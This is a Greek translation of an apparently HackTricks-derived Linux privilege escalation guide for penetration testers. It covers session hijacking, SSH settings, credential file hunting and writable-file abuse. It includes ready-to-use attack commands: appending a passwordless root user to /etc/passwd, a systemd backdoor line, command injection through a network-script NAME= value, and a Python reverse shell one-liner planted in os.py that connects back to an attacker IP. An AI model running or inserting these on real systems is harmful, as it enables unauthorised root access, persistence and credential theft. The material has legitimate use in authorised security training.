Οι Linux capabilities παρέχουν ένα **υποσύνολο των διαθέσιμων προνομίων του root σε μια διεργασία**. Αυτό ουσιαστικά διασπά τα root **προνόμια σε μικρότερες και διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να χορηγηθεί ανεξάρτητα σε διεργασίες. Έτσι μειώνεται το πλήρες σύνολο προνομίων, μειώνοντας τον κίνδυνο εκμετάλλευσης.\
Διαβάστε την ακόλουθη σελίδα για να **μάθετε περισσότερα για τις δυνατότητες και πώς να τις καταχραστείτε**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Δικαιώματα καταλόγου

Σε έναν κατάλογο, το **bit για "execute"** σημαίνει ότι ο αντίστοιχος χρήστης μπορεί να **cd** στον φάκελο.\
Το **"read"** bit υποδηλώνει ότι ο χρήστης μπορεί να **list** τα **files**, και το **"write"** bit ότι ο χρήστης μπορεί να **delete** και να **create** νέα **files**.

## ACLs

Οι Access Control Lists (ACLs) αποτελούν το δευτερεύον επίπεδο διακριτικών δικαιωμάτων, ικανό να **αναιρεί τα παραδοσιακά ugo/rwx permissions**. Αυτά τα δικαιώματα βελτιώνουν τον έλεγχο πρόσβασης σε αρχεία ή καταλόγους, επιτρέποντας ή απορρίπτοντας δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι οι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομέρειας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** στον χρήστη "kali" δικαιώματα read και write σε ένα αρχείο:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Λήψη** αρχείων με συγκεκριμένα ACLs από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Ανοικτές shell συνεδρίες

Σε **παλαιότερες εκδόσεις** μπορείτε να **hijack** κάποια **shell** συνεδρία άλλου χρήστη (**root**).\
Σε **νεότερες εκδόσεις** θα μπορείτε να **συνδεθείτε** σε screen sessions μόνο του **δικού σας χρήστη**. Ωστόσο, μπορεί να βρείτε **ενδιαφέρουσες πληροφορίες μέσα στη συνεδρία**.

### screen sessions hijacking

**Λίστα screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Σύνδεση σε συνεδρία**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Αυτό ήταν ένα πρόβλημα με τις **παλιές tmux εκδόσεις**. Δεν κατάφερα να hijack μια tmux (v2.1) session που είχε δημιουργηθεί από τον root ως χρήστης χωρίς προνόμια.

**Λίστα tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Συνδεθείτε σε μια συνεδρία**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** για ένα παράδειγμα.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH keys που δημιουργήθηκαν σε συστήματα βασισμένα σε Debian (Ubuntu, Kubuntu, κ.λπ.) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 ενδέχεται να επηρεάζονται από αυτό το σφάλμα.\
Αυτό το σφάλμα προκύπτει κατά τη δημιουργία νέου ssh key σε αυτά τα OS, καθώς **μόνο 32,768 παραλλαγές ήταν δυνατές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείτε να αναζητήσετε το αντίστοιχο private key**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται η αυθεντικοποίηση με κωδικό. Η προεπιλογή είναι `no`.
- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται η αυθεντικοποίηση με public key. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν επιτρέπεται η αυθεντικοποίηση με κωδικό, καθορίζει αν ο διακομιστής επιτρέπει είσοδο σε λογαριασμούς με κενές συμβολοσειρές κωδικού. Η προεπιλογή είναι `no`.

### PermitRootLogin

Καθορίζει αν ο root μπορεί να συνδεθεί μέσω ssh, η προεπιλογή είναι `no`. Πιθανές τιμές:

- `yes`: ο root μπορεί να συνδεθεί χρησιμοποιώντας κωδικό και private key
- `without-password` or `prohibit-password`: ο root μπορεί να συνδεθεί μόνο με private key
- `forced-commands-only`: ο root μπορεί να συνδεθεί μόνο με private key και μόνο εάν έχουν καθοριστεί οι επιλογές commands
- `no` : όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν τα public keys που μπορούν να χρησιμοποιηθούν για την αυθεντικοποίηση χρηστών. Μπορεί να περιέχει tokens όπως `%h`, που θα αντικατασταθούν από τον κατάλογο home. **Μπορείτε να δηλώσετε απόλυτες διαδρομές** (ξεκινώντας από `/`) ή **σχετικές διαδρομές από το home του χρήστη**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η ρύθμιση θα υποδείξει ότι αν προσπαθήσεις να συνδεθείς με το **private** key του χρήστη "**testusername**", το ssh θα συγκρίνει το public key του κλειδιού σου με εκείνα που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Το SSH agent forwarding σου επιτρέπει να **use your local SSH keys instead of leaving keys** (χωρίς passphrases!) να μένουν στο server σου. Έτσι, θα μπορείς να **jump** via ssh **to a host** και από εκεί **jump to another** host **using** το **key** που βρίσκεται στον **initial host** σου.

Πρέπει να ορίσεις αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:
```
Host example.com
ForwardAgent yes
```
Παρατηρήστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης αλλάζει μηχάνημα, αυτός ο host θα μπορεί να έχει πρόσβαση στα κλειδιά (που αποτελεί ζήτημα ασφαλείας).

Το αρχείο `/etc/ssh_config` μπορεί να **αντικαταστήσει** αυτές τις **επιλογές** και να επιτρέψει ή να απορρίψει αυτή τη ρύθμιση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απορρίψει** το ssh-agent forwarding με τη λέξη-κλειδί `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Σημαντικά Αρχεία

### Αρχεία προφίλ

Το αρχείο `/etc/profile` και τα αρχεία κάτω από το `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Αν βρεθεί κάποιο περίεργο profile script, πρέπει να το ελέγξετε για **ευαίσθητες λεπτομέρειες**.

### Passwd/Shadow Files

Ανάλογα με το OS τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να χρησιμοποιούν διαφορετικό όνομα ή να υπάρχει κάποιο backup. Επομένως συνιστάται να **τα βρείτε όλα** και **ελέγξετε αν μπορείτε να τα διαβάσετε** ώστε να δείτε **αν υπάρχουν hashes** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο `/etc/passwd` (ή στο αντίστοιχο αρχείο)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Πρώτα, δημιούργησε έναν κωδικό με μία από τις παρακάτω εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Στη συνέχεια, πρόσθεσε τον χρήστη `hacker` και όρισε τον δημιουργημένο κωδικό πρόσβασης.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Τώρα μπορείτε να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν δοκιμαστικό χρήστη χωρίς κωδικό πρόσβασης.\ ΠΡΟΕΙΔΟΠΟΙΗΣΗ: μπορεί να υποβαθμίσει την τρέχουσα ασφάλεια της μηχανής.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Σε πλατφόρμες BSD το `/etc/passwd` βρίσκεται στο `/etc/pwd.db` και στο `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάζεται σε `/etc/spwd.db`.

Πρέπει να ελέγξεις αν μπορείς να **γράψεις σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείς να γράψεις σε κάποιο **service configuration file**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν η μηχανή τρέχει έναν **tomcat** server και μπορείτε να **modify the Tomcat service configuration file inside /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει ο tomcat.

### Έλεγχος φακέλων

Οι ακόλουθοι φάκελοι μπορεί να περιέχουν backups ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορείτε να διαβάσετε τον τελευταίο, αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Περίεργη Τοποθεσία/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία τελευταίων λεπτών
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Αρχεία Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυμμένα αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries σε PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς

Διάβασε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ψάχνει για **πολλά πιθανά αρχεία που μπορεί να περιέχουν κωδικούς**.\
**Ένα ακόμα ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε γι' αυτό είναι: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) το οποίο είναι μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών κωδικών που αποθηκεύονται σε έναν τοπικό υπολογιστή για Windows, Linux & Mac.

### Logs

Αν μπορείτε να διαβάσετε logs, μπορεί να καταφέρετε να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο παράξενο είναι ένα log, τόσο πιο ενδιαφέρον πιθανότατα θα είναι.\
Επίσης, κάποια "**κακώς**" configured (backdoored?) **audit logs** μπορεί να σας επιτρέψουν να **καταγράψετε κωδικούς** μέσα στα audit logs όπως εξηγείται σε αυτή την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε τα logs**, η ομάδα [**adm**](interesting-groups-linux-pe/index.html#adm-group) θα είναι πολύ χρήσιμη.

### Shell αρχεία
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Γενική Αναζήτηση Creds/Regex

Επίσης πρέπει να ελέγξετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομα** τους ή στο **περιεχόμενο**, και επίσης να ελέγξετε για IPs και emails μέσα σε logs, ή hashes regexps.\
Δεν πρόκειται να απαριθμήσω εδώ πώς να κάνετε όλα αυτά αλλά αν σας ενδιαφέρει μπορείτε να ελέγξετε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

Αν ξέρετε από **πού** θα εκτελεστεί ένα python script και **μπορείτε να γράψετε μέσα** σε αυτόν τον φάκελο ή **μπορείτε να τροποποιήσετε python libraries**, μπορείτε να τροποποιήσετε τη βιβλιοθήκη OS και να την backdoor (αν μπορείτε να γράψετε εκεί όπου θα εκτελεστεί το python script, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).

Για να **backdoor the library** απλώς προσθέστε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (αλλάξτε IP και PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **write permissions** σε ένα log αρχείο ή στους γονικούς καταλόγους του να αποκτήσουν ενδεχομένως αυξημένα προνόμια. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά τρέχει ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελέσει αυθαίρετα αρχεία, ειδικά σε καταλόγους όπως _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχετε τα δικαιώματα όχι μόνο στο _/var/log_ αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται η περιστροφή logs.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει το `logrotate` στην έκδοση `3.18.0` και παλαιότερες

Περισσότερες λεπτομέρειες για την ευπάθεια υπάρχουν σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** οπότε όποτε διαπιστώνετε ότι μπορείτε να τροποποιήσετε logs, ελέγξτε ποιος τα διαχειρίζεται και αν μπορείτε να αυξήσετε προνόμια αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Εάν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **write** ένα `ifcf-<whatever>` script στο _/etc/sysconfig/network-scripts_ **ή** να **adjust** ένα υπάρχον, τότε το σύστημά σας είναι **pwned**.

Τα network scripts, π.χ. _ifcg-eth0_, χρησιμοποιούνται για συνδέσεις δικτύου. Μοιάζουν ακριβώς με .INI αρχεία. Ωστόσο, \~sourced\~ στο Linux από τον Network Manager (dispatcher.d).

Στην περίπτωσή μου, η τιμή `NAME=` σε αυτά τα network scripts δεν χειρίζεται σωστά. Αν έχετε **κενό στο όνομα, το σύστημα προσπαθεί να εκτελέσει το μέρος μετά το κενό**. Αυτό σημαίνει ότι **ό,τι βρίσκεται μετά το πρώτο κενό εκτελείται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημείωση: ο κενός χώρος μεταξύ Network και /bin/id_)

### **init, init.d, systemd, και rc.d**

Ο κατάλογος `/etc/init.d` φιλοξενεί **scripts** για System V init (SysVinit), το **κλασικό Linux service management system**. Περιλαμβάνει scripts για `start`, `stop`, `restart`, και μερικές φορές `reload` υπηρεσίες. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω symbolic links που βρίσκονται στο `/etc/rc?.d/`. Εναλλακτική διαδρομή σε Redhat συστήματα είναι `/etc/rc.d/init.d`.

Από την άλλη, το `/etc/init` συνδέεται με **Upstart**, ένα νεότερο σύστημα διαχείρισης υπηρεσιών που εισήχθη από το Ubuntu, χρησιμοποιώντας αρχεία ρυθμίσεων για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση σε Upstart, τα SysVinit scripts εξακολουθούν να χρησιμοποιούνται παράλληλα με τις Upstart ρυθμίσεις λόγω ενός στρώματος συμβατότητας στο Upstart.

Το **systemd** εμφανίζεται ως ένας σύγχρονος αρχικοποιητής και διαχειριστής υπηρεσιών, παρέχοντας προηγμένες δυνατότητες όπως εκκίνηση daemons κατά απαίτηση, διαχείριση automount και snapshots κατάστασης συστήματος. Οργανώνει αρχεία σε `/usr/lib/systemd/` για πακέτα διανομής και `/etc/systemd/system/` για τροποποιήσεις από τον διαχειριστή, απλοποιώντας τη διαδικασία διαχείρισης του συστήματος.

## Άλλα Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Τα Android rooting frameworks συχνά κάνουν hook σε ένα syscall για να εκθέσουν προνομιακή λειτουργικότητα του kernel σε έναν userspace manager. Αδύναμη authentication του manager (π.χ. έλεγχοι υπογραφής βασισμένοι στο FD-order ή ανεπαρκή password schemes) μπορεί να επιτρέψει σε μια τοπική εφαρμογή να προσποιηθεί τον manager και να ανυψωθεί σε root σε συσκευές που είναι ήδη rooted. Μάθετε περισσότερα και λεπτομέρειες εκμετάλλευσης εδώ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Καλύτερο εργαλείο για την εύρεση Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Αναφορές

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
